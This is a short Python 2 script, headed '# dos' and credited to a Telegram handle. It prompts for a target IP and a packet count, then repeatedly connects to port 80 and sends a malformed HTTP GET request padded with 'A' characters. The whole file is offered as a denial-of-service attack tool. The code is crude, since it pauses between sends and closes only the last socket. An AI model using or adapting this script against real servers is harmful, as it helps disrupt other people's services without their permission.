# dos
# id in the telegram: @SmallProgrammers
# sp6.ir , ZC001 :)
from socket import *
import time

u = raw_input("Enter the ip = ")
num = input("Enter the nun dos = ")
p = 0
for i in range(1,num):
	s = socket(AF_INET , SOCK_STREAM)
	s.connect((u , 80))
	pack = "A"*100
	s.send("GET / HTTP 1.1\r\n"+pack)
	p = p+1
	print "Send Packet ",p
	time.sleep(2)


s.close()
